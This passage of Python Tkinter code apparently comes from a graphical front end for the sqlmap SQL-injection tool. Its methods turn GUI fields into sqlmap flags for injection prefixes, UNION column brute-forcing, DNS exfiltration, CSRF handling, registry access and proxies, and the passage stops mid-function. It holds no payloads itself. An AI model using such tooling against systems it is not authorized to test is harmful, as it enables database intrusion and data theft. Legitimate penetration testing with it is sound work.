    # --reg-key=REGKEY    Windows registry key
    @property
    def f_reg_key(self):
        sql_reg_key = self.chk_reg_key_var.get()
        if sql_reg_key == "on":
            reg_key_sql = ' --reg-key="%s"' % (self.e_reg_key.get())
        else:
            reg_key_sql = ""
        return reg_key_sql

    # --reg-value=REGVAL  Windows registry key value
    @property
    def f_reg_value(self):
        sql_reg_value = self.chk_reg_value_var.get()
        if sql_reg_value == "on":
            reg_value_sql = ' --reg-value="%s"' % (self.e_reg_value.get())
        else:
            reg_value_sql = ""
        return reg_value_sql

    # --reg-data=REGDATA  Windows registry key value data
    @property
    def f_reg_data(self):
        sql_reg_data = self.chk_reg_data_var.get()
        if sql_reg_data == "on":
            reg_data_sql = ' --reg-data="%s"' % (self.e_reg_data.get())
        else:
            reg_data_sql = ""
        return reg_data_sql

    # --reg-type=REGTYPE  Windows registry key value type
    @property
    def f_reg_type(self):
        sql_reg_type = self.chk_reg_type_var.get()
        if sql_reg_type == "on":
            reg_type_sql = ' --reg-type="%s"' % (self.e_reg_type.get())
        else:
            reg_type_sql = ""
        return reg_type_sql

    # --api
    @property
    def f_api(self):
        sql_api = self.chk_api_var.get()
        if sql_api == "on":
            api_sql = ' --api'
        else:
            api_sql = ""
        return api_sql

    # --taskid
    @property
    def f_task_id(self):
        sql_task_id = self.chk_task_id_var.get()
        if sql_task_id == "on":
            task_id_sql = ' --taskid'
        else:
            task_id_sql = ""
        return task_id_sql

    # --database
    @property
    def f_database(self):
        sql_database = self.chk_database_var.get()
        if sql_database == "on":
            database_sql = ' --database'
        else:
            database_sql = ""
        return database_sql

    # --sql-query=QUERY   SQL statement to be executed
    def f_sql_query(self, *args):
        sql_query = self.chk_sql_query_var.get()
        if sql_query == "on":
            self.e_sql_query.config(state='normal')
            query_sql = ' --sql-query="%s"' % (self.e_sql_query.get())
        else:
            self.e_sql_query.config(state='disabled')
            query_sql = ""
        return query_sql

    # --data=DATA         Data string to be sent through POST
    @property
    def f_data(self):
        sql_data = self.chk_data_var.get()
        if sql_data == "on":
            data_sql = ' --data="%s"' % (self.e_data.get())
        else:
            data_sql = ""
        return data_sql

    # --param-del=PARA..  Character used for splitting parameter values
    @property
    def f_param_del(self):
        sql_param_del = self.chk_param_del_var.get()
        if sql_param_del == "on":
            param_del_sql = ' --param-del="%s"' % (self.e_param_del.get())
        else:
            param_del_sql = ""
        return param_del_sql

    # --cookie=COOKIE     HTTP Cookie header value
    @property
    def f_cookie(self):
        sql_cookie = self.chk_cookie_var.get()
        if sql_cookie == "on":
            cookie_sql = ' --cookie="%s"' % (self.e_cookie.get())
        else:
            cookie_sql = ""
        return cookie_sql

    # --live-cookies=L.. Live cookies file used for loading up-to-date values
    def f_live_cookies(self):
        sql_live_cookies = self.chk_live_cookies_var.get()
        if sql_live_cookies == "on":
            filename = tkinter.filedialog.askopenfile(mode='r')
            if filename:
                self.var_read_live_cookies.set(filename.name)
        elif sql_live_cookies == "off":
            self.var_read_live_cookies.set("")
        return

    # --live-cookies=L.. Live cookies file used for loading up-to-date values
    @property
    def read_live_cookies(self):
        sql_read_live_cookies = self.var_read_live_cookies.get()
        if sql_read_live_cookies != "":
            read_live_cookies_sql = ' --live-cookies="%s"' % sql_read_live_cookies
        else:
            read_live_cookies_sql = ""
        return read_live_cookies_sql

    # --load-cookies=L..  File containing cookies in Netscape/wget format
    def f_load_cookies(self):
        sql_load_cookies = self.chk_load_cookies_var.get()
        if sql_load_cookies == "on":
            filename = tkinter.filedialog.askopenfile(mode='r')
            if filename:
                self.var_read_load_cookies.set(filename.name)
        elif sql_load_cookies == "off":
            self.var_read_load_cookies.set("")
        return

    # --load-cookies=L..  File containing cookies in Netscape/wget format
    @property
    def read_load_cookies(self):
        sql_read_load_cookies = self.var_read_load_cookies.get()
        if sql_read_load_cookies != "":
            read_load_cookies_sql = ' --load-cookies="%s"' % sql_read_load_cookies
        else:
            read_load_cookies_sql = ""
        return read_load_cookies_sql

    # --drop-set-cookie   Ignore Set-Cookie header from response
    @property
    def f_drop_set_cookie(self):
        sql_drop_set_cookie = self.chk_drop_set_sookie_var.get()
        if sql_drop_set_cookie == "on":
            drop_set_cookie_sql = ' --drop-set-cookie'
        else:
            drop_set_cookie_sql = ""
        return drop_set_cookie_sql

    # --randomize=RPARAM  Randomly change value for given parameter(s)
    def f_randomize(self, *args):
        sql_randomize = self.chk_randomize_var.get()
        if sql_randomize == "on":
            self.e_randomize.config(state='normal')
            randomize_sql = ' --randomize="%s"' % (self.e_randomize.get())
        else:
            self.e_randomize.config(state='disabled')
            randomize_sql = ""
        return randomize_sql

    # --force-ssl         Force usage of SSL/HTTPS requests
    @property
    def f_force_ssl(self):
        sql_force_ssl = self.chk_force_ssl_var.get()
        if sql_force_ssl == "on":
            force_ssl_sql = ' --force-ssl'
        else:
            force_ssl_sql = ""
        return force_ssl_sql

    # --random-agent     Use randomly selected HTTP User-Agent header
    @property
    def f_random_agent(self):
        sql_random_agent = self.chk_random_agent_var.get()
        if sql_random_agent == "on":
            random_agent_sql = ' --random-agent'
        else:
            random_agent_sql = ""
        return random_agent_sql

    # --proxy-cred=PCRED  HTTP proxy authentication credentials (name:password)
    def f_proxy_cred(self, *args):
        sql_proxy_cred = self.chk_proxy_cred_var.get()
        if sql_proxy_cred == "on":
            self.e_proxy_cred.config(state='normal')
            proxy_cred_sql = ' --proxy-cred="%s"' % (self.e_proxy_cred.get())
        else:
            self.e_proxy_cred.config(state='disabled')
            proxy_cred_sql = ""
        return proxy_cred_sql

    # --ignore-proxy      Ignore system default HTTP proxy
    @property
    def f_ignore_proxy(self):
        sql_ignore_proxy = self.chk_ignore_proxy_var.get()
        if sql_ignore_proxy == "on":
            ignore_proxy_sql = ' --ignore-proxy'
        else:
            ignore_proxy_sql = ""
        return ignore_proxy_sql

    # --ignore-redirects    Ignore redirection attempts
    @property
    def f_ignore_redirects(self):
        sql_ignore_redirects = self.chk_ignore_redirects_var.get()
        if sql_ignore_redirects == "on":
            ignore_redirects_sql = ' --ignore-redirects'
        else:
            ignore_redirects_sql = ""
        return ignore_redirects_sql

    # --ignore-timeouts   Ignore connection timeouts
    @property
    def f_ignore_timeouts(self):
        sql_ignore_timeouts = self.chk_ignore_timeouts_var.get()
        if sql_ignore_timeouts == "on":
            ignore_timeouts_sql = ' --ignore-timeouts'
        else:
            ignore_timeouts_sql = ""
        return ignore_timeouts_sql

    # --proxy-file=PRO..  Load proxy list from a file
    def f_proxy_file(self):
        sql_proxy_file = self.chk_proxy_file_var.get()
        if sql_proxy_file == "on":
            filename = tkinter.filedialog.askopenfile(mode='r')
            if filename:
                self.chk_read_proxy_file_var.set(filename.name)
        elif sql_proxy_file == "off":
            self.chk_read_proxy_file_var.set("")
        return

    # --proxy-file=PRO..  Load proxy list from a file
    @property
    def f_read_proxy_file(self):
        sql_read_proxy_file = self.chk_read_proxy_file_var.get()
        if sql_read_proxy_file != "":
            sql_read_proxy_file = ' --proxy-file="%s"' % sql_read_proxy_file
        else:
            sql_read_proxy_file = ""
        return sql_read_proxy_file

    # --proxy-freq=PRO.. Requests between change of proxy from a given list
    def f_proxy_freq(self, *args):
        sql_proxy_freq = self.chk_proxy_freq_var.get()
        if sql_proxy_freq == "on":
            self.e_proxy_freq.config(state='normal')
            proxy_freq_sql = ' --proxy-freq="%s"' % (self.e_proxy_freq.get())
        else:
            self.e_proxy_freq.config(state='disabled')
            proxy_freq_sql = ""
        return proxy_freq_sql

    # --hpp               Use HTTP parameter pollution
    @property
    def f_hpp(self):
        sql_hpp = self.chk_hpp_var.get()
        if sql_hpp == "on":
            hpp_sql = ' --hpp'
        else:
            hpp_sql = ""
        return hpp_sql

    # --cookie-del=COO..  Character used for splitting cookie values
    @property
    def f_cookie_del(self):
        sql_cookie_del = self.chk_cookie_del_var.get()
        if sql_cookie_del == "on":
            cookie_del_sql = ' --cookie-del="%s"' % (self.e_cookie_del.get())
        else:
            cookie_del_sql = ""
        return cookie_del_sql

    # --host=HOST         HTTP Host header
    def f_host(self, *args):
        sql_host = self.chk_host_var.get()
        if sql_host == "on":
            self.e_host.config(state='normal')
            host_sql = ' --host="%s"' % (self.e_host_value.get())
        else:
            self.e_host.config(state='disabled')
            host_sql = ""
        return host_sql

    # --referer=REFERER   HTTP Referer header
    def f_referer(self, *args):
        sql_referer = self.chk_referer_var.get()
        if sql_referer == "on":
            self.e_referer.config(state='normal')
            referer_sql = ' --referer="%s"' % (self.e_referer_value.get())
        else:
            self.e_referer.config(state='disabled')
            referer_sql = ""
        return referer_sql

    # --headers=HEADERS   Extra headers (e.g. "Accept-Language: fr\nETag: 123")
    def f_headers(self, *args):
        sql_headers = self.chk_headers_var.get()
        if sql_headers == "on":
            self.e_headers.config(state='normal')
            headers_sql = ' --headers="%s"' % (self.e_headers_value.get())
        else:
            self.e_headers.config(state='disabled')
            headers_sql = ""
        return headers_sql

    # --headers=@file.txt load your own txt file with headers
    def f_load_headers(self):
        sql_load_headers = self.chk_load_headers_var.get()
        if sql_load_headers == "on":
            filename = tkinter.filedialog.askopenfilename(initialdir="./SQM/", title="broweser_simulation_header",
                                                          filetypes=(("txt files", "*.txt"), ("all files", "*.*")))
            if filename:
                self.var_read_load_headers.set(filename)
        elif sql_load_headers == "off":
            self.var_read_load_headers.set("")
        return

    # --headers=@file.txt load your own txt file with headers
    @property
    def read_load_headers(self):
        sql_read_load_headers = self.var_read_load_headers.get()
        if sql_read_load_headers != "":
            read_load_headers_sql = ' --headers="%s"' % sql_read_load_headers
        else:
            read_load_headers_sql = ""
        return read_load_headers_sql

    # --auth-type=ATYPE   HTTP authentication type (Basic, Digest or NTLM)
    def f_auth_type(self, *args):
        sql_auth_type = self.chk_auth_type_var.get()
        if sql_auth_type == "on":
            self.e_auth_type.config(state='normal')
            auth_type_sql = ' --auth-type="%s"' % (self.e_auth_type.get())
        else:
            self.e_auth_type.config(state='disabled')
            auth_type_sql = ""
        return auth_type_sql

    # --auth-cred=ACRED   HTTP authentication credentials (name:password)
    def f_auth_cred(self, *args):
        sql_auth_cred = self.chk_auth_cred_var.get()
        if sql_auth_cred == "on":
            self.e_auth_cred.config(state='normal')
            auth_cred_sql = ' --auth-cred="%s"' % (self.e_auth_cred.get())
        else:
            self.e_auth_cred.config(state='disabled')
            auth_cred_sql = ""
        return auth_cred_sql

    # --auth-file=AUTH..  HTTP authentication PEM cert/private key file
    def f_auth_file(self):
        sql_auth_file = self.chk_auth_file_var.get()
        if sql_auth_file == "on":
            filename = tkinter.filedialog.askopenfile(mode='r')
            if filename:
                self.var_auth_file.set(filename.name)
        elif sql_auth_file == "off":
            self.var_auth_file.set("")
        return

    # --auth-file=AUTH..  HTTP authentication PEM cert/private key file
    @property
    def read_auth_file(self):
        auth_file = self.var_auth_file.get()
        if auth_file != "":
            sql_auth_file = ' --auth-file="%s"' % auth_file
        else:
            sql_auth_file = ""
        return sql_auth_file

    # --delay=DELAY       Delay in seconds between each HTTP request
    def f_delay(self, *args):
        sql_delay = self.chk_delay_var.get()
        if sql_delay == "on":
            self.e_delay.config(state='normal')
            delay_sql = ' --delay="%s"' % (self.e_delay_value.get())
        else:
            self.e_delay.config(state='disabled')
            delay_sql = ""
        return delay_sql

    # --timeout=TIMEOUT   Seconds to wait before timeout connection (default 30)
    def f_time_out(self, *args):
        sql_time_out = self.chk_time_out_var.get()
        if sql_time_out == "on":
            self.e_time_out.config(state='normal')
            time_out_sql = ' --timeout="%s"' % (self.e_time_out.get())
        else:
            self.e_time_out.config(state='disabled')
            time_out_sql = ""
        return time_out_sql

    # --retries=RETRIES   Retries when the connection timeouts (default 3)
    def f_retries(self, *args):
        sql_retries = self.chk_retries_var.get()
        if sql_retries == "on":
            self.e_retries.config(state='normal')
            retries_sql = ' --retries="%s"' % (self.e_retries.get())
        else:
            self.e_retries.config(state='disabled')
            retries_sql = ""
        return retries_sql

    # --safe-url=SAFURL   Url address to visit frequently during testing
    def f_safe_url(self):
        sql_safe_url = self.chk_safe_url_var.get()
        if sql_safe_url == "on":
            safe_url_sql = ' --safe-url="%s"' % (self.e_safe_url.get())
        else:
            safe_url_sql = ""
        return safe_url_sql

    # --skip-urlencode    Skip URL encoding of payload data
    @property
    def f_skip_urlencode(self):
        sql_skip_urlencode = self.chk_skip_urlencode_var.get()
        if sql_skip_urlencode == "on":
            skip_urlencode_sql = ' --skip-urlencode'
        else:
            skip_urlencode_sql = ""
        return skip_urlencode_sql

    # --eval=EVALCODE Evaluate provided Python code before the request (e.g."import hashlib;id2=hashlib.md5(id).hexdige
    def f_eval_code(self, *args):
        sql_eval_code = self.chk_eval_code_var.get()
        if sql_eval_code == "on":
            self.e_eval_code.config(state='normal')
            eval_code_sql = ' --eval="%s"' % (self.e_eval_code.get())
        else:
            self.e_eval_code.config(state='disabled')
            eval_code_sql = ""
        return eval_code_sql

    # --chunked            Use HTTP chunked transfer encoded (POST) requests
    @property
    def f_chunked(self):
        sql_chunked = self.chk_chunked_var.get()
        if sql_chunked == "on":
            chunked_sql = ' --chunked'
        else:
            chunked_sql = ""
        return chunked_sql

    # --method=METHOD     Force usage of given HTTP method (e.g. PUT)
    def f_method(self, *args):
        sql_method = self.chk_method_var.get()
        self.e_method.config(state='readonly')
        if sql_method == "on":
            method_sql = ' --method="%s"' % (self.e_method_value.get())
        else:
            self.e_method.config(state='disabled')
            method_sql = ""
        return method_sql

    # -H HEADER, --hea..  Extra header (e.g. "X-Forwarded-For: 127.0.0.1")
    def f_header(self, *args):
        sql_header = self.chk_header_var.get()
        if sql_header == "on":
            self.e_header.config(state='normal')
            header_sql = ' -H "%s"' % (self.e_header_value.get())
        else:
            self.e_header.config(state='disabled')
            header_sql = ""
        return header_sql

    # --ignore-code=IG..  Ignore HTTP error code (e.g. 401)
    def f_ignore(self, *args):
        sql_ignore = self.chk_ignore_var.get()
        if sql_ignore == "on":
            self.e_ignore.config(state='normal')
            ignore_sql = ' --ignore-code="%s"' % (self.e_ignore_value.get())
        else:
            self.e_ignore.config(state='disabled')
            ignore_sql = ""
        return ignore_sql

    # --safe-post=SAFE..  POST data to send to a safe URL
    @property
    def f_safe_post(self):
        sql_safe_post = self.chk_safe_post_var.get()
        if sql_safe_post == "on":
            safe_post_sql = ' --safe-post="%s"' % (self.e_safe_post.get())
        else:
            safe_post_sql = ""
        return safe_post_sql

    # --safe-req=SAFER..  Load safe HTTP request from a file
    @property
    def f_safe_req(self):
        sql_safe_req = self.chk_safe_req_var.get()
        if sql_safe_req == "on":
            safe_req_sql = ' --safe-req="%s"' % (self.e_safe_req.get())
        else:
            safe_req_sql = ""
        return safe_req_sql

    # --safe-freq=SAFE..  Test requests between two visits to a given safe URL
    @property
    def f_safe_freq(self):
        sql_safe_freq = self.chk_safe_freq_var.get()
        if sql_safe_freq == "on":
            safe_freq_sql = ' --safe-freq="%s"' % (self.e_safe_freq.get())
        else:
            safe_freq_sql = ""
        return safe_freq_sql

    #  --csrf-token=CSR..  Parameter used to hold anti-CSRF token
    def f_csrf_token(self):
        sql_csrf_token = self.chk_csrf_token_var.get()
        if sql_csrf_token == "on":
            csrf_token_sql = ' --csrf-token="%s"' % (self.e_csrf_token.get())
        else:
            csrf_token_sql = ""
        return csrf_token_sql

    # --csrf-method=CS..  HTTP method to use during anti-CSRF token page visit
    def f_csrf_method(self, *args):
        sql_csrf_method = self.chk_csrf_method_var.get()
        self.e_csrf_method.config(state='readonly')
        if sql_csrf_method == "on":
            csrf_method_sql = ' --csrf-method="%s"' % (self.e_csrf_method_value.get())
        else:
            self.e_csrf_method.config(state='disabled')
            csrf_method_sql = ""
        return csrf_method_sql
    
    # --csrf-data=POST data to send during anti-CSRF token page visit
    def f_csrf_data(self, *args):
        sql_csrf_data = self.chk_csrf_data_method_var.get()
        if sql_csrf_data == "on":
            csrf_data_sql = ' --csrf-data="%s"' % (self.e_csrf_data.get())
        else:
            csrf_data_sql = ""
        return csrf_data_sql

    # --csrf-retries    Retries for anti-CSRF token retrieval
    def f_csrf_retries(self, *args):
        sql_csrf_retries = self.chk_csrf_retries_var.get()
        if sql_csrf_retries == "on":
            csrf_retries_sql = ' --csrf-retries="%s"' % (self.e_csrf_retries_value.get())
        else:
            csrf_retries_sql = ""
        return csrf_retries_sql

    #  --csrf-url=CSRFURL  URL address to visit to extract anti-CSRF token
    @property
    def f_csrf_url(self, *args):
        sql_csrf_url = self.chk_csrf_url_var.get()
        if sql_csrf_url == "on":
            csrf_url_sql = ' --csrf-url="%s"' % (self.e_csrf_url.get())
        else:
            csrf_url_sql = ""
        return csrf_url_sql

    # --prefix=PREFIX     Injection payload prefix string
    def f_prefix(self, *args):
        sql_prefix = self.chk_prefix_var.get()
        if sql_prefix == "on":
            self.e_prefix.config(state='normal')
            prefix_sql = ' --prefix="%s"' % (self.e_prefix_value.get())
        else:
            self.e_prefix.config(state='disabled')
            prefix_sql = ""
        return prefix_sql

    # --suffix=SUFFIX     Injection payload suffix string
    def f_suffix(self, *args):
        sql_suffix = self.chk_suffix_var.get()
        if sql_suffix == "on":
            self.e_suffix.config(state='normal')
            suffix_sql = ' --suffix="%s"' % (self.e_suffix_value.get())
        else:
            self.e_suffix.config(state='disabled')
            suffix_sql = ""
        return suffix_sql

    # --os=OS             Force back-end DBMS operating system to this value
    def f_os(self, *args):
        sql_os = self.chk_os_var.get()
        if sql_os == "on":
            self.e_os.config(state='normal')
            os_sql = ' --os=%s' % (self.e_os.get())
        else:
            self.e_os.config(state='disabled')
            os_sql = ""
        return os_sql

    # --skip=SKIP         Skip testing for given parameter(s)
    @property
    def f_skip(self):
        sql_skip = self.chk_skip_var.get()
        if sql_skip == "on":
            skip_sql = ' --skip="%s"' % (self.e_skip.get())
        else:
            skip_sql = ""
        return skip_sql

    # --invalid-logical   Use logical operations for invalidating values
    @property
    def f_invalid_logical(self):
        sql_invalid_logical = self.chk_invalid_logical_var.get()
        if sql_invalid_logical == "on":
            invalid_logical_sql = " --invalid-logical"
        else:
            invalid_logical_sql = ""
        return invalid_logical_sql

    # --invalid-bignum    Use big numbers for invalidating values
    @property
    def f_invalid_bignum(self):
        sql_invalid_bignum = self.chk_invalid_bignum_var.get()
        if sql_invalid_bignum == "on":
            invalid_bignum_sql = " --invalid-bignum"
        else:
            invalid_bignum_sql = ""
        return invalid_bignum_sql

    # --no-cast           Turn off payload casting mechanism
    @property
    def f_no_cast(self):
        sql_no_cast = self.chk_no_cast_var.get()
        if sql_no_cast == "on":
            no_cast_sql = " --no-cast"
        else:
            no_cast_sql = ""
        return no_cast_sql

    # --no-escape         Turn off string escaping mechanism
    @property
    def f_no_escape(self):
        sql_no_escape = self.chk_no_escape_var.get()
        if sql_no_escape == "on":
            no_escape_sql = " --no-escape"
        else:
            no_escape_sql = ""
        return no_escape_sql

    # --invalid-string    Use random strings for invalidating values
    @property
    def f_invalid_string(self):
        sql_invalid_string = self.chk_invalid_string_var.get()
        if sql_invalid_string == "on":
            invalid_string_sql = " --invalid-string"
        else:
            invalid_string_sql = ""
        return invalid_string_sql

    # --string=STRING     String to match when query is evaluated to True
    def f_string(self, *args):
        sql_string = self.chk_string_var.get()
        if sql_string == "on":
            self.e_string.config(state='normal')
            string_sql = ' --string="%s"' % (self.e_string.get())
        else:
            self.e_string.config(state='disabled')
            string_sql = ""
        return string_sql

    # --not-string=NOT  String to match when query is evaluated to False
    def f_not_string(self, *args):
        sql_not_string = self.chk_not_string_var.get()
        if sql_not_string == "on":
            self.e_not_string.config(state='normal')
            not_string_sql = ' --not-string="%s"' % (self.e_not_string.get())
        else:
            self.e_not_string.config(state='disabled')
            not_string_sql = ""
        return not_string_sql

    # --regexp=REGEXP     Regexp to match when query is evaluated to True
    def f_regexp(self, *args):
        sql_regexp = self.chk_regexp_var.get()
        if sql_regexp == "on":
            self.e_regexp.config(state='normal')
            regexp_sql = ' --regexp="%s"' % (self.e_regexp.get())
        else:
            self.e_regexp.config(state='disabled')
            regexp_sql = ""
        return regexp_sql

    # --code=CODE         HTTP code to match when query is evaluated to True
    def f_code(self, *args):
        sql_code = self.chk_code_var.get()
        if sql_code == "on":
            self.e_code.config(state='normal')
            code_sql = ' --code=%s' % (self.e_code_value.get())
        else:
            self.e_code.config(state='disabled')
            code_sql = ""
        return code_sql

    # --union-cols=UCOLS  Range of columns to test for UNION query SQL injection
    def f_union_cols(self, *args):
        sql_union_cols = self.chk_union_cols_var.get()
        if sql_union_cols == "on":
            self.e_union_cols.config(state='normal')
            col_sql = ' --union-cols="%s"' % (self.e_union_cols_value.get())
        else:
            self.e_union_cols.config(state='disabled')
            col_sql = ""
        return col_sql

    # --union-char=UCHAR  Character to use for bruteforcing number of columns
    def f_union_char(self, *args):
        sql_union_char = self.chk_union_char_var.get()
        if sql_union_char == "on":
            self.e_union_char.config(state='normal')
            union_char_sql = ' --union-char="%s"' % (self.e_union_char_value.get())
        else:
            self.e_union_char.config(state='disabled')
            union_char_sql = ""
        return union_char_sql

    # --union-from=UFROM  Table to use in FROM part of UNION query SQL injection
    def f_union_from(self, *args):
        sql_union_from = self.chk_union_from_var.get()
        if sql_union_from == "on":
            self.e_union_from.config(state='normal')
            union_from_sql = ' --union-from="%s"' % (self.e_union_from_value.get())
        else:
            self.e_union_from.config(state='disabled')
            union_from_sql = ""
        return union_from_sql

    # --time-sec=TIMESEC  Seconds to delay the DBMS response (default 5)
    def f_time_sec(self, *args):
        sql_time_sec = self.chk_time_sec_var.get()
        if sql_time_sec == "on":
            self.e_time_sec.config(state='normal')
            sec_sql = ' --time-sec="%s"' % (self.e_time_sec_value.get())
        else:
            self.e_time_sec.config(state='disabled')
            sec_sql = ""
        return sec_sql

    # -o                  Turn on all optimization switches
    @property
    def f_optimization(self):
        sql_optimization = self.chk_optimization_var.get()
        if sql_optimization == "on":
            optimization_sql = " -o"
        else:
            optimization_sql = ""
        return optimization_sql

    # --predict-output    Predict common queries output
    @property
    def f_predict_output(self):
        sql_predict_output = self.chk_predict_output_var.get()
        if sql_predict_output == "on":
            predict_output_sql = " --predict-output"
        else:
            predict_output_sql = ""
        return predict_output_sql

    # --keep-alive        Use persistent HTTP(s) connections
    @property
    def f_keep_alive(self):
        sql_keep_alive = self.chk_keep_alive_var.get()
        if sql_keep_alive == "on":
            keep_alive_sql = " --keep-alive"
        else:
            keep_alive_sql = ""
        return keep_alive_sql

    # --null-connection   Retrieve page length without actual HTTP response body
    @property
    def f_null_connection(self):
        sql_null_connection = self.chk_null_connection_var.get()
        if sql_null_connection == "on":
            null_connection_sql = " --null-connection"
        else:
            null_connection_sql = ""
        return null_connection_sql

    # --text-only         Compare pages based only on the textual content
    @property
    def f_text_only(self):
        sql_text_only = self.chk_text_only_var.get()
        if sql_text_only == "on":
            text_only_sql = " --text-only"
        else:
            text_only_sql = ""
        return text_only_sql

    # --titles            Compare pages based only on their titles
    @property
    def f_titles(self):
        sql_titles = self.chk_titles_var.get()
        if sql_titles == "on":
            titles_sql = " --titles"
        else:
            titles_sql = ""
        return titles_sql

    # --batch             Never ask for user input, use the default behaviour
    @property
    def f_batch(self):
        sql_batch = self.chk_batch_var.get()
        if sql_batch == "on":
            batch_sql = " --batch"
        else:
            batch_sql = ""
        return batch_sql
    
    # --no-logging          Stop logging creating
    @property
    def f_no_logging(self):
        sql_no_logging = self.chk_no_logging_var.get()
        if sql_no_logging == "on":
            no_logging_sql = " --no-logging"
        else:
            no_logging_sql = ""
        return no_logging_sql

    # --binary-fields=..  Result fields having binary values (e.g. "digest")
    def f_binary_fields(self, *args):
        sql_binary_fields = self.chk_binary_fields_var.get()
        if sql_binary_fields == "on":
            self.e_binary_fields.config(state='normal')
            binary_fields_sql = ' --binary-fields="%s"' % (self.e_binary_fields.get())
        else:
            self.e_binary_fields.config(state='disabled')
            binary_fields_sql = ""
        return binary_fields_sql

    # --hex               Use DBMS hex function(s) for data retrieval
    @property
    def f_hex(self):
        sql_hex = self.chk_hex_var.get()
        if sql_hex == "on":
            hex_sql = " --hex"
        else:
            hex_sql = ""
        return hex_sql

    # --save=SAVECONFIG   Save options to a configuration INI file
    def f_save(self):
        sql_save_config = self.chk_Save_var.get()
        if sql_save_config == "on":
            save_config_file = tkinter.filedialog.asksaveasfile(mode='w', defaultextension=".ini")
            if save_config_file:
                self.var_save_config.set(save_config_file.name)
        elif sql_save_config == "off":
            self.var_save_config.set("")
        return

    # --save=SAVECONFIG   Save options to a configuration INI file
    @property
    def save_config(self):
        config_file = self.var_save_config.get()
        if config_file != "":
            sql_config_file = ' --save="%s"' % config_file
        else:
            sql_config_file = ""
        return sql_config_file

    # --scope=SCOPE       Regexp to filter targets from provided proxy log
    @property
    def f_scope(self):
        sql_scope = self.chk_scope_var.get()
        if sql_scope == "on":
            scope_sql = ' --scope="%s"' % self.e_scope.get()
        else:
            scope_sql = ""
        return scope_sql

    # --har=HARFILE       Log all HTTP traffic into a HAR file
    def f_har(self):
        sql_har = self.chk_har_var.get()
        if sql_har == "on":
            har_file = tkinter.filedialog.asksaveasfile(mode='w', defaultextension=".har")
            if har_file:
                self.var_har_file.set(har_file.name)
        elif sql_har == "off":
            self.var_har_file.set("")
        return

    # --har=HARFILE       Log all HTTP traffic into a HAR file
    @property
    def save_har_file(self):
        har_file = self.var_har_file.get()
        if har_file != "":
            sql_har_file = ' --har="%s"' % har_file
        else:
            sql_har_file = ""
        return sql_har_file

    # -b, --banner        Retrieve DBMS banner
    @property
    def f_banner(self):
        sql_banner = self.f_banner_var.get()
        if sql_banner == "on":
            banner_sql = ' --banner'
        else:
            banner_sql = ""
        return banner_sql

    # -f, --fingerprint   Perform an extensive DBMS version fingerprint
    @property
    def f_finger_print(self):
        sql_finger_print = self.chk_finger_print_var.get()
        if sql_finger_print == "on":
            finger_print_sql = " -f"
        else:
            finger_print_sql = ""
        return finger_print_sql

    # --dbms=DBMS         Force back-end DBMS to this value
    def f_dbms(self, *args):
        sql_dbms = self.chk_dbms_var.get()
        if sql_dbms == "on":
            self.box.config(state='readonly')
            dbms_sql = ' --dbms=%s' % (self.box.get())
        else:
            self.box.config(state='disabled')
            dbms_sql = ""
        return dbms_sql

    # --dbms-cred=DBMS..  DBMS authentication credentials (user:password)
    def f_dbms_cred(self, *args):
        sql_dbms_cred = self.chk_dbms_cred_var.get()
        if sql_dbms_cred == "on":
            self.e_dbms_cred.config(state='normal')
            dbms_cred_sql = ' --dbms-cred="%s"' % (self.e_dbms_cred.get())
        else:
            self.e_dbms_cred.config(state='disabled')
            dbms_cred_sql = ""
        return dbms_cred_sql

    # -p TESTPARAMETER    Testable parameter(s)
    def f_test_parameter(self, *args):
        sql_test_parameter = self.chk_test_parameter_var.get()
        if sql_test_parameter == "on":
            self.e_test_parameter.config(state='normal')
            test_parameter_sql = ' -p %s' % (self.e_test_parameter.get())
        else:
            self.e_test_parameter.config(state='disabled')
            test_parameter_sql = ""
        return test_parameter_sql

    # --param-exclude     Regexp to exclude parameters from testing (e.g. \"ses\")
    def f_param_exclude(self):
        sql_param_exclude = self.chkParam_exclude_var.get()
        if sql_param_exclude == "on":
            sql_param_exclude = ' --param-exclude="%s"' % (self.entry_param_exclude.get())
        else:
            sql_param_exclude = ""
        return sql_param_exclude

    # --level=LEVEL       Level of tests to perform (1-5, default 1)
    def f_level(self, *args):
        sql_level = self.chk_level_var.get()
        if sql_level == "on":
            self.e_level.config(state='readonly')
            level_sql = ' --level=%s' % (self.e_level_value.get())
        else:
            self.e_level.config(state='disabled')
            level_sql = ""
        return level_sql

    # --risk=RISK         Risk of tests to perform (1-3, default 1)
    def f_risk(self, *args):
        sql_risk = self.chk_risk_var.get()
        if sql_risk == "on":
            self.e_risk.config(state='readonly')
            risk_sql = ' --risk=%s' % (self.e_risk_value.get())
        else:
            self.e_risk.config(state='disabled')
            risk_sql = ""
        return risk_sql

    # -v VERBOSE            Verbosity level: 0-6 (default 1)
    def f_verbose(self, *args):
        sql_verbose = self.chk_verbose_var.get()
        if sql_verbose == "on":
            self.e_verbose.config(state='readonly')
            verb_sql = ' -v %s' % (self.e_verbose_value.get())
        else:
            self.e_verbose.config(state='disabled')
            verb_sql = ""
        return verb_sql

    # --threads=THREADS   Max number of concurrent HTTP(s) requests (default 1)
    def f_threads(self, *args):
        sql_threads = self.chk_threads_var.get()
        if sql_threads == "on":
            self.threads.config(state='readonly')
            threads_sql = ' --threads=%s' % (self.threads_value.get())
        else:
            self.threads.config(state='disabled')
            threads_sql = ""
        return threads_sql

    # --technique=TECH    SQL injection techniques to use (default "BEUSTQ")
    def f_technique(self, *args):
        sql_technique = self.chk_tech_var.get()
        if sql_technique == "on":
            self.e_technique.config(state='normal')
            technique_sql = ' --technique=%s' % (self.e_technique_value.get())
        else:
            self.e_technique.config(state='disabled')
            technique_sql = ""
        return technique_sql

    # --dns-domain=DNS..  Domain name used for DNS exfiltration attack
    def f_dns_domain(self, *args):
        sql_dns_domain = self.chk_dns_domain_var.get()
        if sql_dns_domain == "on":
            self.e_dns_domain.config(state='normal')
            dns_sql = ' --dns-domain="%s"' % (self.e_dns_domain.get())
        else:
            self.e_dns_domain.config(state='disabled')
            dns_sql = ""
        return dns_sql

    # --second-url=SEC..  Resulting page URL searched for second-order response
    def f_second_url(self, *args):
        sql_second_url = self.chk_second_url_var.get()
        if sql_second_url == "on":
            self.entry_sec_url.config(state='normal')
            second_url_sql = ' --second-url="%s"' % (self.e_second_url_value.get())
        else:
            self.entry_sec_url.config(state='disabled')
            second_url_sql = ""
        return second_url_sql

    # --second-req=SEC..  Load second-order HTTP request from file
    def f_second_req(self, *args):
        sql_second_req = self.chk_second_req_var.get()
        if sql_second_req == "on":
            self.entry_second_req.config(state='normal')
            sec_req_sql = ' --second-req="%s"' % (self.e_second_req_value.get())
        else:
            self.entry_second_req.config(state='disabled')
